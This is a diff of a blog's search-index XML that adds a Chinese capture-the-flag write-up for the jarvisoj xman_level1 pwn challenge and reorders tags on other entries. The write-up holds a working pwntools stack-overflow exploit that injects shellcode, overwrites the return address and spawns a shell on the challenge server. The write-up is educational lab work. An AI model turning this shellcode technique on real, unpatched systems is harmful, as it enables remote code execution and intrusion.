@@ -3,6 +3,29 @@
   
     
     <entry>
+      <title>jarvisoj_xmanlevel1</title>
+      <link href="/2019/10/22/jarvisoj-xmanlevel1/"/>
+      <url>/2019/10/22/jarvisoj-xmanlevel1/</url>
+      
+        <content type="html"><![CDATA[<p>xman_level1 of jarvisoj…pwn practice.</p><a id="more"></a><h1 id="xman-level1"><a href="#xman-level1" class="headerlink" title="xman_level1"></a>xman_level1</h1><p>栈可执行，无栈溢出防护。</p><pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> checksec<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/root/ctf/level1'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>    RWX:      Has RWX segments</code></pre><p>简单分析可得此题是栈溢出+栈上执行shellcode：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20191022213119.png" alt=""></p><p>buf大小为0x88，因此可以直接写脚本：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwn2.jarvisoj.com'</span><span class="token punctuation">,</span> <span class="token number">9877</span><span class="token punctuation">)</span>line1 <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>buf_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>line1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> <span class="token string">'\x90'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x88</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>buf_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20191022214508.png" alt=""></p><blockquote><p>  <code>x86</code>下可以通过最左边的参数（栈顶），不断指针的移动来判断出其他的参数的值（可变参数），因为x86下，参数储存的位置是连续的。注意是4字节对齐（最小为4字节）。</p><p>  <code>x64</code>下面在x64下函数调用的前4个参数总是放在寄存器中传递，剩余的参数则压入堆栈中。而x86上则是全部压入堆栈中(除了fastcall方式)。</p></blockquote>]]></content>
+      
+      
+      <categories>
+          
+          <category> binary </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
       <title>flodbg_junkcode</title>
       <link href="/2019/10/21/flodbg-junkcode/"/>
       <url>/2019/10/21/flodbg-junkcode/</url>
@@ -388,11 +411,11 @@
       
         <tags>
             
+            <tag> 网络安全 </tag>
+            
             <tag> 资讯 </tag>
             
             <tag> 译文 </tag>
-            
-            <tag> 网络安全 </tag>
             
         </tags>
       
@@ -415,9 +438,9 @@
       
         <tags>
             
-            <tag> 网络安全 </tag>
-            
             <tag> ssrf </tag>
+            
+            <tag> 网络安全 </tag>
             
             <tag> write-up </tag>
             
